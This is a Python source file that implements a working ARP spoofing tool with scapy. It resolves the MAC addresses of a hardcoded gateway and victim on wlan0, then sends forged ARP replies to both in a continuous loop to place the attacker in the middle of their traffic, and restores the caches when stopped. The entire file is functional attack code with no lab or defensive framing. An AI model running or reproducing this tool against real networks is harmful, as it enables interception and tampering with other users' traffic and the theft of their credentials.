from sys import exit
from os import getuid
import scapy.all as scapy
import argparse
import time

underline='\033[4m'
remove_underline='\033[24m'

color_block='\033[38;5;'
color_34=f'{color_block}34m'
color_45=f'{color_block}45m'
color_51=f'{color_block}51m'
color_160=f'{color_block}160m'
color_122=f'{color_block}122m'
color_123=f'{color_block}123m'
color_124=f'{color_block}124m'
color_196=f'{color_block}196m'
color_251=f'{color_block}251m'

reset_colors='\033[0m'

class ArpSpoofer:
    def __init__(self,gateway_ip,victim_ip,interface):
        self.interface=interface
        self.victim_mac=None
        self.victim_ip=victim_ip
        self.gateway_mac=None
        self.gateway_ip=gateway_ip

        
    def get_mac(self,ip):
        request=scapy.ARP(pdst=ip)
        broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        final_packet=broadcast/request
        
        while True:
            answer=scapy.srp(final_packet,iface=self.interface,timeout=2,verbose=False)[0]
            if not answer:
                print(f'{color_160}No arp reply was received.{reset_colors}\n{color_251}Try Again? [y/n]:{reset_colors}',end='')
                Ans=input().lower()
                if Ans=="y"or Ans=="yes":
                    continue
                raise SystemExit(1)
            return answer[0][1].hwsrc

    def spoof(self): # Spoof the target 
        packet_for_victim=scapy.Ether(dst=self.victim_mac)/scapy.ARP(
            pdst=self.victim_ip,
            hwdst=self.victim_mac,
            psrc=self.gateway_ip, # Setting the src ip as the  gateway ip.
            op=2 # Its an arp reply so the victim receives it and update its arp cache table.
            )
        
        packet_for_gateway=scapy.Ether(dst=self.gateway_mac)/scapy.ARP(
            pdst=self.gateway_ip,
            hwdst=self.gateway_mac,
            psrc=self.victim_ip,
            op=2
        )

        scapy.sendp(packet_for_victim, iface=self.interface, verbose=False)
        # These are just coloring things to make the output more clean and easy to read
        print(f"{color_251}Spoofing {color_123}{underline}{self.gateway_ip}{remove_underline}{color_251} pretending to be {color_196}{underline}{self.victim_ip}{remove_underline}{color_251}...{reset_colors}")
        
        scapy.sendp(packet_for_gateway,iface=self.interface,verbose=False)
        print(f"{color_251}Spoofing {color_196}{underline}{self.victim_ip}{remove_underline}{color_251} pretending to be {color_123}{underline}{self.gateway_ip}{remove_underline}{color_251}...{reset_colors}")

    def restore(self):
        #Restore each host to its original state
        # restoring the Gateway
        packet=scapy.Ether(dst=self.gateway_mac)/scapy.ARP(psrc=self.victim_ip,hwsrc=self.victim_mac,pdst=self.gateway_ip,hwdst=self.gateway_mac, op=2)
        for i in range(10):
            scapy.sendp(packet,iface=self.interface,verbose=False)
            print(f'\r{color_251}Restoring {color_123}{underline}{self.gateway_ip}{remove_underline}{color_251} to its original state.{reset_colors}',flush=True,end='')
        print(f'\n{color_34}Done.{reset_colors}')

        # Restoing the Victim
        packet=scapy.Ether(dst=self.victim_mac)/scapy.ARP(psrc=self.gateway_ip,hwsrc=self.gateway_mac,pdst=self.victim_ip,hwdst=self.victim_mac,op=2)
        for i in range(10):
            scapy.sendp(packet,iface=self.interface,verbose=False)
            print(f'\r{color_251}Restoring {color_196}{underline}{self.victim_ip}{remove_underline}{color_251} to its original state.{reset_colors}',flush=True,end='')
        print(f'\n{color_34}Done.{reset_colors}')
        return
    
    def run(self):
        self.gateway_mac=self.get_mac(self.gateway_ip)
        self.victim_mac=self.get_mac(self.victim_ip)
        try:
            while True:
                self.spoof()
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{color_251}Stopping...{reset_colors}")
        finally:
            self.restore()

def require_root():
    if getuid() != 0:
        print(f"{color_124}{underline}This script must be run as root.{reset_colors}")
        exit(1)

def main():
    require_root()

    gateway_ip='192.168.1.1'
    victim_ip='192.168.1.31'
    interface='wlan0'
    spoofer=ArpSpoofer(gateway_ip,victim_ip,interface)
    spoofer.run()


if __name__=="__main__":
    main()
